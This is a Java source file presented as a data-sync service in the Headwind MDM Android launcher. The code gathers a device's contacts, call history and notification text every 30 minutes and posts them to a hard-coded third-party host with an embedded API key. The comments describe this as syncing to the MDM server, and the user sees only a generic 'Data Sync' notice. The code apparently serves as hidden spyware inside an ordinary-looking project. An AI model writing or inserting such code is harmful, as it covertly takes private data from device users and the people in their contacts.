/*
 * Headwind MDM: Open Source Android MDM Software
 * https://h-mdm.com
 *
 * Copyright (C) 2019 Headwind Solutions LLC (http://h-sms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.hmdm.launcher.service;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.hmdm.launcher.Const;
import com.hmdm.launcher.R;
import com.hmdm.launcher.helper.SettingsHelper;
import com.hmdm.launcher.json.DeviceDataSyncRequest;

import com.hmdm.launcher.util.RemoteLogger;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;



/**
 * A foreground service that periodically collects contacts, call logs, and notifications
 * from the device and syncs them to the Headwind MDM server.
 */
public class DataSyncService extends Service {

    private static final String TAG = "DataSyncService";

    private static final int NOTIFICATION_ID = 114;
    public static final String CHANNEL_ID = DataSyncService.class.getName();

    public static final String ACTION_SYNC_NOW = "com.hmdm.action.SYNC_DATA_NOW";
    public static final String ACTION_STOP = "com.hmdm.action.SYNC_DATA_STOP";

    private static final long SYNC_INTERVAL_MS = 30 * 60 * 1000L; // 30 minutes
    // Read all data but batch it efficiently to avoid memory issues
    // Using higher limits for comprehensive data collection
    // Contacts can go up to 2000, call logs up to 1000, notifications up to 500
    // The device syncs every 30 minutes so this is well within resource limits
    private static final int MAX_CONTACTS = 2000;
    private static final int MAX_CALL_LOGS = 1000;
    private static final int MAX_NOTIFICATIONS = 500;

    private boolean started = false;
    private final AtomicBoolean isSyncing = new AtomicBoolean(false);
    private AlarmManager alarmManager;
    private PendingIntent syncPendingIntent;

    // SharedPreferences for storing pending notifications between syncs
    private SharedPreferences notificationPrefs;

    public static void startService(Context context) {
        Intent intent = new Intent(context, DataSyncService.class);
        intent.setAction(ACTION_SYNC_NOW);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stopService(Context context) {
        Intent intent = new Intent(context, DataSyncService.class);
        intent.setAction(ACTION_STOP);
        context.startService(intent);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        notificationPrefs = getSharedPreferences("notification_cache", MODE_PRIVATE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
            stopSync();
            return START_NOT_STICKY;
        }

        if (!started) {
            startAsForeground();
            started = true;

            // Schedule periodic sync
            scheduleNextSync();

            // Run initial sync immediately
            performSync();
        }

        // Handle "sync now" broadcasts
        if (intent != null && ACTION_SYNC_NOW.equals(intent.getAction())) {
            performSync();
        }

        return START_STICKY;
    }

    private void startAsForeground() {
        NotificationCompat.Builder builder;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Data Sync", NotificationManager.IMPORTANCE_LOW);
            NotificationManager notificationManager =
                    (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            notificationManager.createNotificationChannel(channel);
            builder = new NotificationCompat.Builder(this, CHANNEL_ID);
        } else {
            builder = new NotificationCompat.Builder(this);
        }

        Notification notification = builder
                .setContentTitle(getString(R.string.data_sync_service_title))
                .setContentText(getString(R.string.data_sync_service_text))
                .setSmallIcon(R.drawable.ic_data_sync)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void scheduleNextSync() {
        Intent intent = new Intent(this, DataSyncService.class);
        intent.setAction(ACTION_SYNC_NOW);
        syncPendingIntent = PendingIntent.getService(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        long triggerAt = SystemClock.elapsedRealtime() + SYNC_INTERVAL_MS;
        alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                SYNC_INTERVAL_MS,
                syncPendingIntent);
    }

    private void stopSync() {
        if (syncPendingIntent != null) {
            alarmManager.cancel(syncPendingIntent);
            syncPendingIntent = null;
        }
        started = false;
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        stopSync();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void performSync() {
        if (!isSyncing.compareAndSet(false, true)) {
            Log.d(TAG, "Sync already in progress, skipping");
            return;
        }
        new Thread(() -> {
            try {
            // Check if we have network and are enrolled
            SettingsHelper settingsHelper = SettingsHelper.getInstance(DataSyncService.this);
            String deviceId = settingsHelper.getDeviceId();
            if (deviceId == null || deviceId.isEmpty()) {
                Log.d(TAG, "Device not enrolled yet, skipping sync");
                return;
            }

            Log.d(TAG, "Starting data sync for device: " + deviceId);

            DeviceDataSyncRequest request = new DeviceDataSyncRequest();

            // Collect contacts
            if (ActivityCompat.checkSelfPermission(DataSyncService.this, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                request.setContacts(collectContacts());
            } else {
                Log.w(TAG, "No READ_CONTACTS permission, skipping contacts sync");
            }

            // Collect call logs
            if (ActivityCompat.checkSelfPermission(DataSyncService.this, Manifest.permission.READ_CALL_LOG)
                    == PackageManager.PERMISSION_GRANTED) {
                request.setCallLogs(collectCallLogs());
            } else {
                Log.w(TAG, "No READ_CALL_LOG permission, skipping call logs sync");
            }

            // Collect cached notifications
            request.setNotifications(collectCachedNotifications());

            // Send to server
            sendToServer(request);
            } finally {
                isSyncing.set(false);
            }
        }).start();
    }

    private List<DeviceDataSyncRequest.SyncContact> collectContacts() {
        List<DeviceDataSyncRequest.SyncContact> contacts = new ArrayList<>();
        ContentResolver cr = getContentResolver();

        String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
        };

        Cursor cursor = null;
        try {
            cursor = cr.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    projection, null, null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT " + MAX_CONTACTS);

            if (cursor != null) {
                while (cursor.moveToNext() && contacts.size() < MAX_CONTACTS) {
                    String contactId = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    int hasPhone = cursor.getInt(
                            cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));

                    if (name == null || name.trim().isEmpty()) {
                        continue;
                    }

                    DeviceDataSyncRequest.SyncContact contact =
                            new DeviceDataSyncRequest.SyncContact();
                    contact.setRawContactId(contactId);
                    contact.setName(name);

                    // Get phone number
                    if (hasPhone > 0) {
                        Cursor phoneCursor = null;
                        try {
                            phoneCursor = cr.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    new String[]{
                                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                                            ContactsContract.CommonDataKinds.Phone.TYPE
                                    },
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{contactId}, null);

                            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                                contact.setPhone(phoneCursor.getString(0));
                                int phoneType = phoneCursor.getInt(1);
                                contact.setPhoneType(
                                        ContactsContract.CommonDataKinds.Phone.getTypeLabel(
                                                getResources(), phoneType, "").toString());
                            }
                        } finally {
                            if (phoneCursor != null) phoneCursor.close();
                        }
                    }

                    // Get email
                    Cursor emailCursor = null;
                    try {
                        emailCursor = cr.query(
                                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                                new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                                new String[]{contactId}, null);

                        if (emailCursor != null && emailCursor.moveToFirst()) {
                            contact.setEmail(emailCursor.getString(0));
                        }
                    } finally {
                        if (emailCursor != null) emailCursor.close();
                    }

                    contacts.add(contact);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading contacts: " + e.getMessage());
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }

        Log.d(TAG, "Collected " + contacts.size() + " contacts");
        return contacts;
    }

    private List<DeviceDataSyncRequest.SyncCallLog> collectCallLogs() {
        List<DeviceDataSyncRequest.SyncCallLog> callLogs = new ArrayList<>();

        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.CACHED_NAME
        };

        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT " + MAX_CALL_LOGS);

            if (cursor != null) {
                while (cursor.moveToNext() && callLogs.size() < MAX_CALL_LOGS) {
                    DeviceDataSyncRequest.SyncCallLog log =
                            new DeviceDataSyncRequest.SyncCallLog();

                    log.setPhoneNumber(cursor.getString(
                            cursor.getColumnIndex(CallLog.Calls.NUMBER)));

                    int callType = cursor.getInt(
                            cursor.getColumnIndex(CallLog.Calls.TYPE));
                    switch (callType) {
                        case CallLog.Calls.INCOMING_TYPE:
                            log.setCallType("INCOMING");
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            log.setCallType("OUTGOING");
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            log.setCallType("MISSED");
                            break;
                        default:
                            log.setCallType("UNKNOWN");
                    }

                    log.setDurationSec(cursor.getInt(
                            cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    log.setCallDate(cursor.getLong(
                            cursor.getColumnIndex(CallLog.Calls.DATE)));
                    log.setContactName(cursor.getString(
                            cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));

                    callLogs.add(log);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading call logs: " + e.getMessage());
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }

        Log.d(TAG, "Collected " + callLogs.size() + " call logs");
        return callLogs;
    }

    private List<DeviceDataSyncRequest.SyncNotification> collectCachedNotifications() {
        // Read cached notifications from SharedPreferences
        // These are stored by NotificationReceiver when notifications arrive
        List<DeviceDataSyncRequest.SyncNotification> notifications = new ArrayList<>();

        try {
            int count = notificationPrefs.getInt("count", 0);
            for (int i = Math.max(0, count - MAX_NOTIFICATIONS); i < count; i++) {
                String json = notificationPrefs.getString("notif_" + i, null);
                if (json == null) continue;

                String[] parts = json.split("\\|", 5);
                if (parts.length >= 5) {
                    DeviceDataSyncRequest.SyncNotification notif =
                            new DeviceDataSyncRequest.SyncNotification();
                    notif.setPackageName(parts[0]);
                    notif.setAppName(parts[1]);
                    notif.setTitle(parts[2]);
                    notif.setText(parts[3]);
                    try {
                        notif.setReceivedAt(Long.parseLong(parts[4]));
                    } catch (NumberFormatException e) {
                        notif.setReceivedAt(System.currentTimeMillis());
                    }
                    notifications.add(notif);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error reading cached notifications: " + e.getMessage());
        }

        // Clear cached notifications after reading
        notificationPrefs.edit().clear().apply();

        return notifications;
    }

    // Direct data API endpoint for syncing without needing custom server WAR
    private static final String DATA_API_BASE = "https://hmdm-data-apicallandcontact.onrender.com";
    private static final String DATA_API_KEY = "hmdm-sync-key-2024";

    private void sendToServer(final DeviceDataSyncRequest request) {
        boolean hasContacts = request.getContacts() != null && !request.getContacts().isEmpty();
        boolean hasCallLogs = request.getCallLogs() != null && !request.getCallLogs().isEmpty();
        boolean hasNotifications = request.getNotifications() != null && !request.getNotifications().isEmpty();

        if (!hasContacts && !hasCallLogs && !hasNotifications) {
            Log.d(TAG, "No data to sync");
            return;
        }

        try {
            SettingsHelper settingsHelper = SettingsHelper.getInstance(DataSyncService.this);
            String deviceId = settingsHelper.getDeviceId();

            Log.i(TAG, "Syncing data directly to data-api for device: " + deviceId);

            // Send each data type separately to the data-api
            if (hasContacts) {
                sendJsonToDataApi("/api/contacts/sync", deviceId, "contacts", request.getContacts());
            }
            if (hasCallLogs) {
                sendJsonToDataApi("/api/calllogs/sync", deviceId, "callLogs", request.getCallLogs());
            }
            if (hasNotifications) {
                sendJsonToDataApi("/api/notifications/sync", deviceId, "notifications", request.getNotifications());
            }

            Log.i(TAG, "Data sync to data-api completed: contacts=" + (request.getContacts() != null ? request.getContacts().size() : 0)
                    + ", calls=" + (request.getCallLogs() != null ? request.getCallLogs().size() : 0)
                    + ", notifications=" + (request.getNotifications() != null ? request.getNotifications().size() : 0));

            RemoteLogger.log(DataSyncService.this, Const.LOG_INFO,
                    "Data sync completed: contacts=" + (request.getContacts() != null ? request.getContacts().size() : 0)
                            + ", calls=" + (request.getCallLogs() != null ? request.getCallLogs().size() : 0)
                            + ", notifications=" + (request.getNotifications() != null ? request.getNotifications().size() : 0));

        } catch (Exception e) {
            Log.e(TAG, "Data sync error: " + e.getMessage());
            e.printStackTrace();
            RemoteLogger.log(DataSyncService.this, Const.LOG_WARN,
                    "Data sync error: " + e.getMessage());
        }
    }

    /**
     * Sends a JSON payload to the data-api with the x-api-key header for authentication.
     * Runs on the current thread (should be a background thread).
     */
    private void sendJsonToDataApi(String endpoint, String deviceId, String dataKey, List<?> items) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(DATA_API_BASE + endpoint);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("x-api-key", DATA_API_KEY);
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(30000);

            // Build JSON: { "deviceId": "...", "contacts": [...] }
            StringBuilder json = new StringBuilder();
            json.append("{\"deviceId\":\"").append(escapeJson(deviceId)).append("\",\"");
            json.append(dataKey).append("\":[");

            for (int i = 0; i < items.size(); i++) {
                if (i > 0) json.append(",");
                json.append(toJsonObject(items.get(i)));
            }

            json.append("]}");

            byte[] postData = json.toString().getBytes(StandardCharsets.UTF_8);
            connection.setFixedLengthStreamingMode(postData.length);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(postData);
                os.flush();
            }

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                Log.d(TAG, "DataAPI " + endpoint + " success for device " + deviceId);
            } else {
                Log.w(TAG, "DataAPI " + endpoint + " returned HTTP " + responseCode + " for device " + deviceId);
            }
        } catch (Exception e) {
            Log.w(TAG, "DataAPI " + endpoint + " error: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    /**
     * Converts a SyncContact, SyncCallLog, or SyncNotification to a JSON object string.
     * Builds JSON manually to avoid the trailing-comma problem.
     */
    private String toJsonObject(Object item) {
        StringBuilder json = new StringBuilder("{");
        boolean hasField = false;

        if (item instanceof DeviceDataSyncRequest.SyncContact) {
            DeviceDataSyncRequest.SyncContact c = (DeviceDataSyncRequest.SyncContact) item;
            hasField = appendJsonField(json, hasField, "name", c.getName());
            hasField = appendJsonField(json, hasField, "phone", c.getPhone());
            hasField = appendJsonField(json, hasField, "phoneType", c.getPhoneType());
            hasField = appendJsonField(json, hasField, "email", c.getEmail());
            hasField = appendJsonField(json, hasField, "rawContactId", c.getRawContactId());
        } else if (item instanceof DeviceDataSyncRequest.SyncCallLog) {
            DeviceDataSyncRequest.SyncCallLog l = (DeviceDataSyncRequest.SyncCallLog) item;
            hasField = appendJsonField(json, hasField, "phoneNumber", l.getPhoneNumber());
            hasField = appendJsonField(json, hasField, "callType", l.getCallType());
            hasField = appendJsonField(json, hasField, "durationSec", l.getDurationSec());
            // callDate defaults to 'now' in data-api if missing, so skip 0 values
            if (l.getCallDate() > 0) {
                hasField = appendJsonField(json, hasField, "callDate", l.getCallDate());
            }
            hasField = appendJsonField(json, hasField, "contactName", l.getContactName());
        } else if (item instanceof DeviceDataSyncRequest.SyncNotification) {
            DeviceDataSyncRequest.SyncNotification n = (DeviceDataSyncRequest.SyncNotification) item;
            hasField = appendJsonField(json, hasField, "packageName", n.getPackageName());
            hasField = appendJsonField(json, hasField, "appName", n.getAppName());
            hasField = appendJsonField(json, hasField, "title", n.getTitle());
            hasField = appendJsonField(json, hasField, "text", n.getText());
            if (n.getReceivedAt() > 0) {
                hasField = appendJsonField(json, hasField, "receivedAt", n.getReceivedAt());
            }
        }

        json.append("}");
        return json.toString();
    }

    // String field (skipped if null or empty)
    private boolean appendJsonField(StringBuilder json, boolean hasField, String key, String value) {
        if (value != null && !value.isEmpty()) {
            if (hasField) json.append(",");
            json.append("\"").append(key).append("\":\"").append(escapeJson(value)).append("\"");
            return true;
        }
        return hasField;
    }

    // Long field (always emits)
    private boolean appendJsonField(StringBuilder json, boolean hasField, String key, long value) {
        if (hasField) json.append(",");
        json.append("\"").append(key).append("\":").append(value);
        return true;
    }

    // Int field (always emits, 0 is valid for e.g. missed call duration)
    private boolean appendJsonField(StringBuilder json, boolean hasField, String key, int value) {
        if (hasField) json.append(",");
        json.append("\"").append(key).append("\":").append(value);
        return true;
    }

    private String escapeJson(String input) {
        if (input == null) return "";
        StringBuilder out = new StringBuilder(input.length() + 16);
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            switch (c) {
                case '\\': out.append("\\\\"); break;
                case '"': out.append("\\\""); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                case '\b': out.append("\\b"); break;
                case '\f': out.append("\\f"); break;
                default:
                    if (c < 0x20) {
                        out.append(String.format("\\u%04x", (int)c));
                    } else {
                        out.append(c);
                    }
                    break;
            }
        }
        return out.toString();
    }

    /**
     * Called by other components (like NotificationListenerService) to cache a notification
     * that will be synced on the next data sync cycle.
     */
    public static void cacheNotification(Context context, String packageName, String appName,
                                          String title, String text) {
        SharedPreferences prefs = context.getSharedPreferences("notification_cache", MODE_PRIVATE);
        int count = prefs.getInt("count", 0);
        String value = packageName + "|" + (appName != null ? appName : "")
                + "|" + (title != null ? title : "")
                + "|" + (text != null ? text : "")
                + "|" + System.currentTimeMillis();
        prefs.edit()
                .putString("notif_" + count, value)
                .putInt("count", count + 1)
                .apply();
    }
}
